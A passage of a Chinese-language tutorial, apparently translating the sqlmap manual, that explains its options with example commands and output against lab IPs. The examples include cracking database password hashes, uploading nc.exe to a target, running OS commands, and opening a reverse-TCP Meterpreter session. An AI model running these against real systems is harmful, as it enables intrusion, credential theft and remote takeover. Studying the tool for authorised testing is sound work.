title="修改注入的数据"></a>修改注入的数据</h4><p>参数：–tamper</p><p>sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以<strong>使用–tamper参数对数据做修改来绕过WAF等设备。</strong></p><p>下面是一个tamper脚本的格式：</p><pre class="line-numbers language-none"><code class="language-none"># Needed importsfrom lib.core.enums import PRIORITY# Define which is the order of application of tamper scripts against# the payload__priority__ = PRIORITY.NORMALdef tamper(payload):    '''    Description of your tamper script    '''    retVal = payload    # your code to tamper the original payload    # return the tampered payload    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设定UNION查询字段数"><a href="#设定UNION查询字段数" class="headerlink" title="设定UNION查询字段数"></a>设定UNION查询字段数</h4><p>参数：–union-cols</p><p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。设定–union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</p><h4 id="设定UNION查询使用的字符"><a href="#设定UNION查询使用的字符" class="headerlink" title="设定UNION查询使用的字符"></a>设定UNION查询使用的字符</h4><p>参数：–union-char</p><p>默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用–union-char只定UNION查询的字符。</p><h4 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h4><p>参数：–second-order</p><p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。</p><p>–second-order后面跟一个判断页面的URL地址。</p><h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><h4 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h4><p>参数：–level</p><p>共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</p><p>这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，<strong>HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</strong></p><p>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p><h4 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h4><p>参数：–risk</p><p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p><p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p><p>测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p><h4 id="页面比较"><a href="#页面比较" class="headerlink" title="页面比较"></a>页面比较</h4><p>参数：–string,–not-string,–regexp,–code</p><p>默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。</p><p>此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。</p><p>用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200。</p><p>参数：–text-only,–titles</p><p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP响应体中不同）–titles（HTML的title标签中不同）。</p><h3 id="列数据"><a href="#列数据" class="headerlink" title="列数据"></a>列数据</h3><h4 id="标志"><a href="#标志" class="headerlink" title="标志"></a>标志</h4><p>参数：-b,–banner</p><p>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。</p><h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><p>参数：-current-user</p><p>在大多数据库中可以获取到管理数据的用户。</p><h4 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h4><p>参数：–current-db</p><p>返还当前连接的数据库。</p><h4 id="当前用户是否为管理用户"><a href="#当前用户是否为管理用户" class="headerlink" title="当前用户是否为管理用户"></a>当前用户是否为管理用户</h4><p>参数：–is-dba</p><p>判断当前的用户是否为管理，是的话会返回True。</p><h4 id="列数据库管理用户"><a href="#列数据库管理用户" class="headerlink" title="列数据库管理用户"></a>列数据库管理用户</h4><p>参数：–users</p><p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p><h4 id="列出并破解数据库用户的hash"><a href="#列出并破解数据库用户的hash" class="headerlink" title="列出并破解数据库用户的hash"></a>列出并破解数据库用户的hash</h4><p>参数：–passwords</p><p>当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p><p>例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1[...]back-end DBMS: PostgreSQL[hh:mm:38] [INFO] fetching database users password hashesdo you want to use dictionary attack on retrieved password hashes? [Y/n/q] y[hh:mm:42] [INFO] using hash method: 'postgres_passwd'what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt][hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'do you want to use common password suffixes? (slow!) [y/N] n[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)[hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'database management system users password hashes:[*] postgres [1]:    password hash: md5d7d880f96044b72d0bba108ace96d1e4    clear-text password: testpass[*] testuser [1]:    password hash: md599e5ea7a6f7c3269995cba3927fd0093    clear-text password: testpass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到sqlmap不仅列出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，这个爆破已经支持Oracle和Microsoft SQL Server。</p><p>也可以提供-U参数来指定爆破哪个用户的hash。</p><h4 id="列出数据库管理员权限"><a href="#列出数据库管理员权限" class="headerlink" title="列出数据库管理员权限"></a>列出数据库管理员权限</h4><p>参数：–privileges</p><p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。</p><h4 id="列出数据库管理员角色"><a href="#列出数据库管理员角色" class="headerlink" title="列出数据库管理员角色"></a>列出数据库管理员角色</h4><p>参数：–roles</p><p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。</p><p>仅适用于当前数据库是Oracle的时候。</p><h4 id="列出数据库系统的数据库"><a href="#列出数据库系统的数据库" class="headerlink" title="列出数据库系统的数据库"></a>列出数据库系统的数据库</h4><p>参数：–dbs</p><p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p><h4 id="列举数据库表"><a href="#列举数据库表" class="headerlink" title="列举数据库表"></a>列举数据库表</h4><p>参数：–tables,–exclude-sysdbs,-D</p><p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p><p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p><p>–exclude-sysdbs参数是指包含了所有的系统数据库。</p><p>需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p><h4 id="列举数据库表中的字段"><a href="#列举数据库表中的字段" class="headerlink" title="列举数据库表中的字段"></a>列举数据库表中的字段</h4><p>参数：–columns,-C,-T,-D</p><p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p><p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p><p>列举一个SQLite的例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" --columns -D testdb -T users -C name[...]Database: SQLite_masterdbTable: users[3 columns]+---------+---------+| Column  | Type    |+---------+---------+| id      | INTEGER || name    | TEXT    || surname | TEXT    |+---------+---------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="列举数据库系统的架构"><a href="#列举数据库系统的架构" class="headerlink" title="列举数据库系统的架构"></a>列举数据库系统的架构</h4><p>参数：–schema,–exclude-sysdbs</p><p>用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。</p><p>加上–exclude-sysdbs参数，将不会获取数据库自带的系统库内容。</p><p>MySQL例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs[...]Database: owasp10Table: accounts[4 columns]+-------------+---------+| Column      | Type    |+-------------+---------+| cid         | int(11) || mysignature | text    || password    | text    || username    | text    |+-------------+---------+Database: owasp10Table: blogs_table[4 columns]+--------------+----------+| Column       | Type     |+--------------+----------+| date         | datetime || blogger_name | text     || cid          | int(11)  || comment      | text     |+--------------+----------+Database: owasp10Table: hitlog[6 columns]+----------+----------+| Column   | Type     |+----------+----------+| date     | datetime || browser  | text     || cid      | int(11)  || hostname | text     || ip       | text     || referer  | text     |+----------+----------+Database: testdbTable: users[3 columns]+---------+---------------+| Column  | Type          |+---------+---------------+| id      | int(11)       || name    | varchar(500)  || surname | varchar(1000) |+---------+---------------+[...]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="获取表中数据个数"><a href="#获取表中数据个数" class="headerlink" title="获取表中数据个数"></a>获取表中数据个数</h4><p>参数：–count</p><p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p><p>列举一个Microsoft SQL Server例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb[...]Database: testdb+----------------+---------+| Table          | Entries |+----------------+---------+| dbo.users      | 4       || dbo.users_blob | 2       |+----------------+---------+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="获取整个表的数据"><a href="#获取整个表的数据" class="headerlink" title="获取整个表的数据"></a>获取整个表的数据</h4><p>参数：–dump,-C,-T,-D,–start,–stop,–first,–last</p><p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。</p><p>使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。</p><p>列举一个Firebird的例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users[...]Database: Firebird_masterdbTable: USERS[4 entries]+----+--------+------------+| ID | NAME   | SURNAME    |+----+--------+------------+| 1  | luther | blisset    || 2  | fluffy | bunny      || 3  | wu     | ming       || 4  | NULL   | nameisnull |+----+--------+------------+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。</p><p>也可以用-dump跟-C获取指定的字段内容。</p><p>sqlmap为每个表生成了一个CSV文件。</p><p>如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可以使用–stop 1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。</p><p>也可以用–first与–last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first 3 –last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p><h4 id="获取所有数据库表的内容"><a href="#获取所有数据库表的内容" class="headerlink" title="获取所有数据库表的内容"></a>获取所有数据库表的内容</h4><p>参数：–dump-all,–exclude-sysdbs</p><p>使用–dump-all参数获取所有数据库表的内容，可同时加上–exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。</p><h4 id="搜索字段，表，数据库"><a href="#搜索字段，表，数据库" class="headerlink" title="搜索字段，表，数据库"></a>搜索字段，表，数据库</h4><p>参数：–search,-C,-T,-D</p><p>–search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。</p><p>可以在一下三种情况下使用：</p><pre class="line-numbers language-none"><code class="language-none">-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="运行自定义的SQL语句"><a href="#运行自定义的SQL语句" class="headerlink" title="运行自定义的SQL语句"></a>运行自定义的SQL语句</h4><p>参数：–sql-query,–sql-shell</p><p>sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。</p><p>如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p><p>列举一个Mircrosoft SQL Server 2000的例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1[...][hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''[hh:mm:14] [INFO] retrieved: fooSELECT 'foo':    'foo'$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo', 'bar'" -v 2[...][hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)), (CHAR(32)))[hh:mm:50] [INFO] retrieved: foo[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)), (CHAR(32)))[hh:mm:50] [INFO] retrieved: bar[hh:mm:50] [DEBUG] performed 27 queries in 0 secondsSELECT 'foo', 'bar':    'foo, bar'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><h4 id="暴力破解表名"><a href="#暴力破解表名" class="headerlink" title="暴力破解表名"></a>暴力破解表名</h4><p>参数：–common-tables</p><p>当使用–tables无法获取到数据库的表时，可以使用此参数。</p><p>通常是如下情况：</p><pre class="line-numbers language-none"><code class="language-none">1、MySQL数据库版本小于5.0，没有information_schema表。2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。3、当前用户没有权限读取系统中保存数据结构的表的权限。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。</p><p>列举一个MySQL 4.1的例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner[...][hh:mm:39] [INFO] testing MySQL[hh:mm:39] [INFO] confirming MySQL[hh:mm:40] [INFO] the back-end DBMS is MySQL[hh:mm:40] [INFO] fetching bannerweb server operating system: Windowsweb application technology: PHP 5.3.1, Apache 2.2.14back-end DBMS operating system: Windowsback-end DBMS: MySQL &lt; 5.0.0banner:    '4.1.21-community-nt'[hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/txt/common-tables.txt'[hh:mm:40] [INFO] adding words used on web page to the check listplease enter number of threads? [Enter for 1 (current)] 8[hh:mm:43] [INFO] retrieved: usersDatabase: testdb[1 table]+-------+| users |+-------+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="暴力破解列名"><a href="#暴力破解列名" class="headerlink" title="暴力破解列名"></a>暴力破解列名</h4><p>参数：–common-columns</p><p>与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。</p><h4 id="用户自定义函数注入"><a href="#用户自定义函数注入" class="headerlink" title="用户自定义函数注入"></a>用户自定义函数注入</h4><p>参数：–udf-inject,–shared-lib</p><p>你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。</p><h3 id="系统文件操作"><a href="#系统文件操作" class="headerlink" title="系统文件操作"></a>系统文件操作</h3><h4 id="从数据库服务器中读取文件"><a href="#从数据库服务器中读取文件" class="headerlink" title="从数据库服务器中读取文件"></a>从数据库服务器中读取文件</h4><p>参数：–file-read</p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p><p>列举一个Microsoft SQL Server 2005的例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \--file-read "C:/example.exe" -v 1[...][hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2000web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2005[hh:mm:50] [INFO] fetching file: 'C:/example.exe'[hh:mm:50] [INFO] the SQL query provided returns 3 entriesC:/example.exe file saved to:    '/software/sqlmap/output/192.168.136.129/files/C__example.exe'[...]$ ls -l output/192.168.136.129/files/C__example.exe -rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe$ file output/192.168.136.129/files/C__example.exe output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel80386 32-bit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 读取后可以看见他的输出位置</p><h4 id="把文件上传到数据库服务器中"><a href="#把文件上传到数据库服务器中" class="headerlink" title="把文件上传到数据库服务器中"></a>把文件上传到数据库服务器中</h4><p>参数：–file-write,–file-dest</p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</p><p>列举一个MySQL的例子：</p><pre class="line-numbers language-none"><code class="language-none">$ file /software/nc.exe.packed /software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit$ ls -l /software/nc.exe.packed-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \"/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1[...][hh:mm:29] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or 2008web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: MySQL &gt;= 5.0.0[...]do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfully written on the back-end DBMS file system? [Y/n] y[hh:mm:52] [INFO] retrieved: 31744[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes, same size as the local file '/software/nc.exe.packed'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行任意操作系统命令"><a href="#运行任意操作系统命令" class="headerlink" title="运行任意操作系统命令"></a>运行任意操作系统命令</h4><p>参数：–os-cmd,–os-shell</p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。</p><p>在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。</p><p>那么他创建的这两个函数可以执行系统命令。在Microsoft SQL  Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server  2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建。</p><p>列举一个PostgreSQL的例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \--os-cmd id -v 1[...]web application technology: PHP 5.2.6, Apache 2.2.9back-end DBMS: PostgreSQL[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system[hh:mm:12] [INFO] the back-end DBMS operating system is Linux[hh:mm:12] [INFO] testing if current user is DBA[hh:mm:12] [INFO] detecting back-end DBMS version from its banner[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF filedo you want to retrieve the command standard output? [Y/n/a] ycommand standard output:    'uid=104(postgres) gid=106(postgres) groups=106(postgres)'[hh:mm:19] [INFO] cleaning up the database management systemdo you want to remove UDF 'sys_eval'? [Y/n] ydo you want to remove UDF 'sys_exec'? [Y/n] y[hh:mm:23] [INFO] database management system cleanup finished[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can only be deleted manually<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用–os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。</p><p>当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：</p><ol><li>ASP</li><li>ASP.NET</li><li>JSP</li><li>PHP</li></ol><h4 id="Meterpreter配合使用"><a href="#Meterpreter配合使用" class="headerlink" title="Meterpreter配合使用"></a>Meterpreter配合使用</h4><p>参数：–os-pwn,–os-smbrelay,–os-bof,–priv-esc,–msf-path,–tmp-path</p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL  Server，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，并有四种方式执行它：</p><pre class="line-numbers language-none"><code class="language-none">1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。4、通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>列举一个MySQL例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn --msf-path /software/metasploit[...][hh:mm:31] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: MySQL 5.0[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system[hh:mm:31] [INFO] the back-end DBMS operating system is Windowshow do you want to establish the tunnel?[1] TCP: Metasploit Framework (default)[2] ICMP: icmpsh - ICMP tunneling&gt; [hh:mm:32] [INFO] testing if current user is DBA[hh:mm:32] [INFO] fetching current userwhat is the back-end database management system architecture?[1] 32-bit (default)[2] 64-bit&gt; [hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist[hh:mm:33] [INFO] detecting back-end DBMS version from its banner[hh:mm:33] [INFO] retrieving MySQL base directory absolute path[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF filehow do you want to execute the Metasploit shellcode on the back-end database underlying operating system?[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)[2] Stand-alone payload stager (file system way)&gt; [hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode which connection type do you want to use?[1] Reverse TCP: Connect back from the database host to this machine (default)[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535[3] Bind TCP: Listen on the database host for a connection&gt; which is the local address? [192.168.136.1] which local port number do you want to use? [60641] which payload do you want to use?[1] Meterpreter (default)[2] Shell[3] VNC&gt; [hh:mm:40] [INFO] creation in progress ... done[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait..                                _                                | |      o_  _  _    _ _|_  __,   ,    _  | |  __    _|_/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  ||  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/                        /|                        \|    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]+ -- --=[ 674 exploits - 351 auxiliary+ -- --=[ 217 payloads - 27 encoders - 8 nops    =[ svn r12272 updated 4 days ago (2011.04.07)PAYLOAD =&gt; windows/meterpreter/reverse_tcpEXITFUNC =&gt; threadLPORT =&gt; 60641LHOST =&gt; 192.168.136.1[*] Started reverse handler on 192.168.136.1:60641 [*] Starting the payload handler...[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_bineval', please wait..[*] Sending stage (749056 bytes) to 192.168.136.129[*] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) at Mon Apr 11 hh:mm:52 +0100 2011meterpreter &gt; Loading extension espia...success.meterpreter &gt; Loading extension incognito...success.meterpreter &gt; [-] The 'priv' extension has already been loaded.meterpreter &gt; Loading extension sniffer...success.meterpreter &gt; System Language : en_USOS              : Windows .NET Server (Build 3790, Service Pack 2).Computer        : W2K3R2Architecture    : x86Meterpreter     : x86/win32meterpreter &gt; Server username: NT AUTHORITY\SYSTEMmeterpreter &gt; ipconfigMS TCP Loopback interfaceHardware MAC: 00:00:00:00:00:00IP Address  : 127.0.0.1Netmask     : 255.0.0.0Intel(R) PRO/1000 MT Network ConnectionHardware MAC: 00:0c:29:fc:79:39IP Address  : 192.168.136.129Netmask     : 255.255.255.0meterpreter &gt; exit[*] Meterpreter session 1 closed.  Reason: User exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认情况下MySQL在Windows上以SYSTEM权限运行，PostgreSQL在Windows与Linux中是低权限运行，Microsoft SQL Server 2000默认是以SYSTEM权限运行，Microsoft SQL Server  2005与2008大部分是以NETWORK SERVICE有时是LOCAL SERVICE。</p><h3 id="对Windows注册表操作"><a href="#对Windows注册表操作" class="headerlink" title="对Windows注册表操作"></a>对Windows注册表操作</h3><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持堆查询。 当然，当前连接数据库的用户也需要有权限操作注册表。</p><h4 id="读取注册表值"><a href="#读取注册表值" class="headerlink" title="读取注册表值"></a>读取注册表值</h4><p>参数：–reg-read</p><h4 id="写入注册表值"><a href="#写入注册表值" class="headerlink" title="写入注册表值"></a>写入注册表值</h4><p>参数：–reg-add</p><h4 id="删除注册表值"><a 